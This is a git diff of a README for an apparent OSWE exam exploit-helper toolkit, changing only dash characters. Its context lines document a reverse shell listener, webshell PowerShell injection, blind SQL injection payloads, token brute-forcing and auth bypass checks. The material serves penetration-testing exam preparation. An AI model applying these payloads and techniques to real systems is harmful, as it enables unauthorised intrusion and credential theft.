@@ -7,7 +7,7 @@ Helper modules for writing OSWE exploit scripts. Pull what you need into your sc
 ## Files
 
 ```
-├── exploit.py              # Main template — start here
+├── exploit.py              # Main template – start here
 ├── utils.py                # Print helpers, regex, password/name generators, PS1 encoder
 ├── shell_listener.py       # TCP reverse shell listener
 ├── web_callback_server.py  # Serve payloads + catch callbacks (XSS, XXE, SSRF)
@@ -16,7 +16,7 @@ Helper modules for writing OSWE exploit scripts. Pull what you need into your sc
 └── websocket_helper.py     # WebSocket response drainer (targets with WS interfaces)
 ```
 
-`exploit.py` has everything inlined — copy it to the exam machine and fill in the stage functions. The other files are reference copies; paste functions from them as needed.
+`exploit.py` has everything inlined – copy it to the exam machine and fill in the stage functions. The other files are reference copies; paste functions from them as needed.
 
 ```bash
 python3 exploit.py -t 192.168.1.100 -l 10.10.10.10 --shell
@@ -24,7 +24,7 @@ python3 exploit.py -t 192.168.1.100 -l 10.10.10.10 --shell
 
 ---
 
-## exploit.py — Flags
+## exploit.py – Flags
 
 | Flag | Default | Description |
 |------|---------|-------------|
@@ -32,13 +32,13 @@ python3 exploit.py -t 192.168.1.100 -l 10.10.10.10 --shell
 | `-l / --lhost` | required | Your tun0 IP |
 | `-p / --lport` | 4444 | Reverse shell port |
 | `-wp / --wport` | 80 | Web callback server port |
-| `-u / --username` | — | Provide a known username to skip enumeration/registration |
-| `-P / --password` | — | Provide a known password to skip brute-forcing |
-| `-f / --file` | — | File path to read (for targets with LFI or XXE) |
+| `-u / --username` | – | Provide a known username to skip enumeration/registration |
+| `-P / --password` | – | Provide a known password to skip brute-forcing |
+| `-f / --file` | – | File path to read (for targets with LFI or XXE) |
 | `--shell` | off | Trigger reverse shell stage |
 | `--proxy` | off | Route all traffic through Burp (127.0.0.1:8080) |
 
-`-u` and `-P` exist because some stages are slow — brute-forcing a token can take a few minutes. Once you have the credentials, pass them directly and skip to the stage you're actually working on.
+`-u` and `-P` exist because some stages are slow – brute-forcing a token can take a few minutes. Once you have the credentials, pass them directly and skip to the stage you're actually working on.
 
 ---
 
@@ -58,13 +58,13 @@ print_banner("MyExploit")             # ══ header at script start
 **Random generators:**
 ```python
 username = generate_random_name()      # e.g. "KXQTMHJZAW"
-password = generate_password()         # e.g. "Xk3!mVqZ..." — upper+lower+digit+special
+password = generate_password()         # e.g. "Xk3!mVqZ..." – upper+lower+digit+special
 email    = username + "@offsec.exam"
 ```
 
 `generate_password()` always satisfies strict validation policies. It avoids shell-breaking characters (quotes, backslashes) so you can safely embed it in payloads.
 
-**Regex extraction** — pull values out of HTML responses:
+**Regex extraction** – pull values out of HTML responses:
 ```python
 # <input type="hidden" name="csrf_token" value="aB3xZ9...">
 csrf  = extract_between_markers(r.text, 'name="csrf_token" value="', '"')
@@ -78,7 +78,7 @@ users = extract_all_between_markers(r.text, "<td>", "</td>")
 
 Uses `re.DOTALL`, so it works on values that span multiple lines.
 
-**PowerShell encoder** — avoids quoting issues when injecting PS1 through a webshell:
+**PowerShell encoder** – avoids quoting issues when injecting PS1 through a webshell:
 ```python
 b64 = encode_ps1("whoami")
 cmd = f"powershell.exe -EncodedCommand {b64}"
@@ -104,7 +104,7 @@ listener_t.join()       # blocks until you exit the session
 
 Two threads: one reads from the socket and prints, the other reads your input and sends. This way neither side blocks the other.
 
-Uncomment `conn.send(b"\n")` inside the function for PowerShell — it kicks the PS1 prompt on connect so you see output immediately.
+Uncomment `conn.send(b"\n")` inside the function for PowerShell – it kicks the PS1 prompt on connect so you see output immediately.
 
 **Reverse shell payloads:**
 ```bash
@@ -184,7 +184,7 @@ def my_check(index: int, char: str) -> bool:
     session.get(TARGET + "/search", params={"q": f"' OR {sqli}--"})
     return time.time() - t0 >= 3
 
-    # Boolean-based (MySQL) — uncomment to use instead
+    # Boolean-based (MySQL) – uncomment to use instead
     # sqli = f"' AND (SELECT SUBSTRING(password,{index},1) FROM users LIMIT 1)='{char}'--"
     # r = session.get(TARGET + "/search", params={"q": sqli})
     # return "Welcome" in r.text
@@ -192,7 +192,7 @@ def my_check(index: int, char: str) -> bool:
 result = extract_string_blind(my_check, length=32, label="password hash")
 ```
 
-All `(position, character)` combinations are submitted at once. The thread pool caps concurrency at `max_workers=30`. For a 32-char string over a 62-char charset, that's ~2000 tasks — done in roughly the time it takes to test a single character sequentially.
+All `(position, character)` combinations are submitted at once. The thread pool caps concurrency at `max_workers=30`. For a 32-char string over a 62-char charset, that's ~2000 tasks – done in roughly the time it takes to test a single character sequentially.
 
 Tune `max_workers` down if you're hitting rate limits, up if the target handles the load.
 
@@ -200,7 +200,7 @@ Tune `max_workers` down if you're hitting rate limits, up if the target handles 
 
 ### token_bruteforce.py
 
-**Generic spray** — works with any list of candidate tokens:
+**Generic spray** – works with any list of candidate tokens:
 
 ```python
 def try_token(token: str) -> bool:
@@ -212,7 +212,7 @@ def try_token(token: str) -> bool:
 winner = spray_tokens(token_list, try_token, label="reset token")
 ```
 
-**Java `util.Random` prediction** — for apps that seed their token generator with `System.currentTimeMillis()`:
+**Java `util.Random` prediction** – for apps that seed their token generator with `System.currentTimeMillis()`:
 
 ```python
 t0 = int(time.time() * 1000)
@@ -278,7 +278,7 @@ r = session.post(BASE_URL + "/upload", files={
 **Reading responses:**
 ```python
 r.status_code           # 200, 302, 403 ...
-r.text                  # decoded body — use for regex
+r.text                  # decoded body – use for regex
 r.json()                # parsed JSON dict
 r.headers["Location"]   # specific header
 r.cookies.get("PHPSESSID")
@@ -290,7 +290,7 @@ session.headers.update({"X-CSRF-Token": csrf, "X-Requested-With": "XMLHttpReques
 session.cookies.update({"PHPSESSID": sid})
 ```
 
-**Auth bypass check** — inspect the 302 before following it:
+**Auth bypass check** – inspect the 302 before following it:
 ```python
 r = session.post(BASE_URL + "/login", data=creds, allow_redirects=False)
 if r.status_code == 302 and "/dashboard" in r.headers.get("Location", ""):
@@ -310,7 +310,7 @@ r = session.post(BASE_URL + "/login", data=creds)
 assert "dashboard" in r.text, f"Login failed ({r.status_code})"
 ```
 
-Many apps return HTTP 200 even on failure — check the response body, not just the status code.
+Many apps return HTTP 200 even on failure – check the response body, not just the status code.
 
 **Print the outgoing request** (useful when something isn't behaving as expected):
 ```python
@@ -325,7 +325,7 @@ print(req.body)
 
 ## Development Tips
 
-**Skip slow stages while iterating** — hardcode a known-good cookie and comment out the early steps:
+**Skip slow stages while iterating** – hardcode a known-good cookie and comment out the early steps:
 ```python
 session.cookies.update({"JSESSIONID": "paste_cookie_here"})
 # register()
@@ -382,7 +382,7 @@ After exporting, open the folder as a workspace in VS Code or Notepad++ for mult
 
 ## Database Debugging
 
-**PostgreSQL — log all queries in real time:**
+**PostgreSQL – log all queries in real time:**
 
 Enable in `postgresql.conf`:
 ```
@@ -399,4 +399,4 @@ Tail the log and filter for SQLi signatures:
 Get-Content "C:\path\to\pgsql\data\pgsql_log\postgresql.log" -Tail 0 -Wait | Select-String -Pattern "ERROR:", "pg_sleep"
 ```
 
-Useful when developing a blind SQLi payload — confirms whether your syntax is actually reaching the database or getting rejected earlier in the stack.
+Useful when developing a blind SQLi payload – confirms whether your syntax is actually reaching the database or getting rejected earlier in the stack.
